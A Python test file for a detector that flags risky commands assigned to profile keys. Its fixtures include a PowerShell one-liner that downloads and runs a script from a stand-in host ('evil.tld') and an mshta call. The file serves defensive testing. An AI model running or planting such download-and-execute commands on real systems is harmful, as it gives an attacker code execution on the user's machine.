"""Tests for command_safety.collect_risky_commands (v0.2.3)."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from command_safety import RISKY_COMMAND_TOKENS, collect_risky_commands


def _profile(*keys: tuple[str, str]) -> list[dict]:
    return [{
        "name": "P",
        "keys": {key_id: {"command": cmd} for key_id, cmd in keys},
    }]


class TestCollectRiskyCommands:
    def test_clean_command_not_flagged(self):
        assert collect_risky_commands(_profile(("0", "notepad.exe"))) == []

    def test_powershell_flagged(self):
        flagged = collect_risky_commands(_profile(("0", "powershell -c (irm evil.tld/x.ps1) | iex")))
        assert len(flagged) == 1
        assert flagged[0][1] == "0"

    def test_case_insensitive_match(self):
        assert collect_risky_commands(_profile(("0", "POWERSHELL -c ..."))) != []
        assert collect_risky_commands(_profile(("0", "Curl http://x"))) != []

    def test_empty_command_skipped(self):
        assert collect_risky_commands(_profile(("0", ""), ("1", "   "))) == []

    def test_missing_command_key_skipped(self):
        profiles = [{"name": "X", "keys": {"0": {"label": "no command field"}}}]
        assert collect_risky_commands(profiles) == []

    def test_returns_profile_name_and_key_id(self):
        profiles = [
            {"name": "Bad", "keys": {"3": {"command": "mshta evil.hta"}}},
            {"name": "OK",  "keys": {"0": {"command": "notepad.exe"}}},
        ]
        flagged = collect_risky_commands(profiles)
        assert flagged == [("Bad", "3", "mshta evil.hta")]

    def test_every_documented_token_caught(self):
        """If someone removes a token from the constant the test breaks loudly."""
        for tok in RISKY_COMMAND_TOKENS:
            profiles = _profile(("0", f"prefix {tok} suffix"))
            assert collect_risky_commands(profiles), f"token {tok!r} not caught"

    def test_non_string_command_value_skipped(self):
        profiles = [{"name": "X", "keys": {"0": {"command": 42}}}]
        assert collect_risky_commands(profiles) == []

    def test_dict_keys_non_dict_value_skipped(self):
        profiles = [{"name": "X", "keys": {"0": "not a dict"}}]
        assert collect_risky_commands(profiles) == []
